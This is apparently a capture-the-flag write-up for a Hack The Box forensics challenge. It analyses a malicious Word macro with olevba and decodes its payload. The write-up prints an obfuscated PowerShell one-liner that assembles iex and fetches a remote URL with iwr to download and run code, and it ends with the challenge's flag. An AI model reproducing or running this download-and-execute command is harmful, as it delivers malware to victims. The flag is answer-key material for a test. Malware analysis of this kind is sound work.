# Lure
> Write-up author: jon-brandy
## DESCRIPTION:
The finance team received an important looking email containing an attached Word document. Can you take a look and confirm if it's malicious?
## HINT:
- NONE
## STEPS:
1. First, unzip the `.zip` file given.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/211131398-7fe32b81-8d0d-417d-be05-06fddd22711f.png)


![image](https://user-images.githubusercontent.com/70703371/211131404-025500cc-086c-4b5c-b1c6-fd4ff6d571bf.png)


2. Based from the description, we shall use `olevba` to extract any malicious macros.

> RESULT


![image](https://user-images.githubusercontent.com/70703371/211131463-20ce1dc1-d175-4646-8442-898c609ac63c.png)


![image](https://user-images.githubusercontent.com/70703371/211131473-6675dbc2-9962-4df5-acb3-7200004cd642.png)


3. Notice there's an encoded powershell command.
4. Let's try with base64 first.

> RESULT - CORRECT 

![image](https://user-images.githubusercontent.com/70703371/211131560-1620cf11-d8e1-443a-a03a-cb7ff63ff9c5.png)


```
pOwErshElL $(-jOiN(($PshOMe[4]),("$PsHoME")[+15],"x");)(iwr $(("{5}{25}{8}{7}{0}{14}{3}{21}{2}{22}{15}{16}{31}{28}{11}{26}{17}{23}{27}{29}{10}{1}{6}{24}{30}{18}{13}{19}{12}{9}{20}{4}"-f "B","U","4","B","%7D","ht","R_d","//ow.ly/HT","p:","T","0","_","N","M","%7","E","f","1T","u","e","5","k","R","h","0","t","w","_","l","Y","C","U")))
```

5. Hmm.. I think we should run this at powershell (?)
6. But let's paste only this strings:

```
$(("{5}{25}{8}{7}{0}{14}{3}{21}{2}{22}{15}{16}{31}{28}{11}{26}{17}{23}{27}{29}{10}{1}{6}{24}{30}{18}{13}{19}{12}{9}{20}{4}"-f "B","U","4","B","%7D","ht","R_d","//ow.ly/HT","p:","T","0","_","N","M","%7","E","f","1T","u","e","5","k","R","h","0","t","w","_","l","Y","C","U"))
```

7. Then enter.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/211131667-9f5415ae-7573-4957-b73d-fb1da56f588e.png)


8. Got the flag! But paste it on cyberchef and choose `decode URL`.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/211131697-e53cf8f7-58d9-4926-8704-c3d594e3eb2c.png)



## FLAG

```
HTB{k4REfUl_w1Th_Y0UR_d0CuMeNT5}
```
